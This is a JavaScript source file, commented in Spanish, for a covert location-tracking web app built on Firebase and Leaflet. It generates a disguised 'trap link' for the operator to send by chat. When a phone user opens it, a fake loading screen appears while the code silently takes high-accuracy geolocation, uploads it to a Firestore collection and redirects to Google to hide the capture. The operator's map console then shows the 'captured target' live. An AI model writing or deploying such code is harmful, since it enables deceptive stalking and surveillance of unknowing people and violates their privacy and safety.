import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import { getFirestore, doc, setDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

// CONFIGURA AQUÍ TUS CREDENCIALES DE FIREBASE
const firebaseConfig = {
    apiKey: "TU_API_KEY",
    authDomain: "tu-proyecto.firebaseapp.com",
    projectId: "tu-proyecto",
    storageBucket: "tu-proyecto.appspot.com",
    messagingSenderId: "TU_MESSAGING_SENDER_ID",
    appId: "TU_APP_ID"
};

// Inicializar Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

let map;
let marker;
const ubicacionPorDefecto = [14.3333, -90.6667]; 

// Detectar si la URL trae un parámetro de objetivo (ej: ?target=objetivo_1)
const urlParams = new URLSearchParams(window.location.search);
const targetId = urlParams.get('target');

// Crear un icono personalizado con el emoji de araña 🕷️
const iconoArana = L.divIcon({
    className: 'custom-spider-icon',
    html: '<div style="font-size: 28px; text-align: center; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.6));">🕷️</div>',
    iconSize: [30, 30],
    iconAnchor: [15, 15]
});

document.addEventListener("DOMContentLoaded", function () {
    // ESCENARIO A: Si alguien abrió el enlace trampa en su celular
    if (targetId) {
        document.body.style.backgroundColor = "#ffffff";
        document.body.innerHTML = "<div style='display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;color:#666;'><h3>Cargando recurso...</h3></div>";
        iniciarCapturaDiscreta(targetId);
        return; 
    }

    // ESCENARIO B: Estás en tu consola principal (PC); inicializamos el mapa
    map = L.map('map', { zoomControl: false }).setView(ubicacionPorDefecto, 14);

    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        maxZoom: 19,
        attribution: '&copy; OpenStreetMap contributors'
    }).addTo(map);

    // Colocar el marcador de araña inicial
    marker = L.marker(ubicacionPorDefecto, { icon: iconoArana }).addTo(map)
        .bindPopup("<b>Sistema en línea.</b> Esperando señal...")
        .openPopup();

    setTimeout(() => { map.invalidateSize(); }, 200);

    // Escuchamos la base de datos en tiempo real
    escucharObjetivoRemoto("objetivo_principal");
});

// Botón SHARE LINK: Genera un enlace personalizado disfrazado
window.compartirEnlace = function() {
    const baseUrl = window.location.origin + window.location.pathname;
    const enlaceObjetivo = `${baseUrl}?target=objetivo_principal`;
    
    navigator.clipboard.writeText(enlaceObjetivo).then(() => {
        alert("¡Enlace copiado con éxito!\nPuedes enviarlo mediante chat.");
    }).catch(err => {
        console.error("Error al copiar enlace:", err);
    });
};

// Capturar ubicación discretamente y salir
function iniciarCapturaDiscreta(id) {
    if (!navigator.geolocation) {
        window.location.href = "https://www.google.com";
        return;
    }

    navigator.geolocation.getCurrentPosition(
        async (position) => {
            const lat = position.coords.latitude;
            const lng = position.coords.longitude;

            try {
                await setDoc(doc(db, "ratreos", id), {
                    lat: lat,
                    lng: lng,
                    timestamp: new Date()
                });
            } catch (e) {
                console.error("Error al guardar:", e);
            }
            
            window.location.href = "https://www.google.com";
        },
        (error) => {
            window.location.href = "https://www.google.com";
        },
        { enableHighAccuracy: true, timeout: 10000 }
    );
}

// Escuchar la ubicación en tu consola principal (PC)
function escucharObjetivoRemoto(id) {
    onSnapshot(doc(db, "ratreos", id), (docSnap) => {
        if (docSnap.exists()) {
            const data = docSnap.data();
            const lat = data.lat;
            const lng = data.lng;

            map.invalidateSize();
            map.setView([lat, lng], 16);
            
            // Actualiza la posición manteniendo el icono de la araña 🕷️
            marker.setLatLng([lat, lng]);
            marker.bindPopup(`<b>¡Objetivo Atrapado!</b><br>Lat: ${lat.toFixed(4)}<br>Lng: ${lng.toFixed(4)}`).openPopup();
            
            document.getElementById('banner-status').innerHTML = "SEÑAL CAPTURADA<br>ARAÑA POSICIONADA";
        }
    });
}

// Funciones secundarias de los botones de la consola
window.obtenerUbicacionActual = function(esInicio = false) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((pos) => {
            const lat = pos.coords.latitude;
            const lng = pos.coords.longitude;
            map.setView([lat, lng], 16);
            marker.setLatLng([lat, lng]).bindPopup("Tu posición local").openPopup();
        });
    }
};

window.accionRastrearObjetivo = () => alert("Sistema operativo al 100%. Memoria de rastreo activa.");
window.centrarUbicacion = () => map.invalidateSize();
window.cambiarAlerta = (t) => alert("Alerta: " + t);
window.cambiarPerfil = (n) => alert("Perfil: " + n);
window.abrirChat = () => alert("Canal de chat seguro abierto.");
window.verArchivo = () => alert("Abriendo registros históricos...");
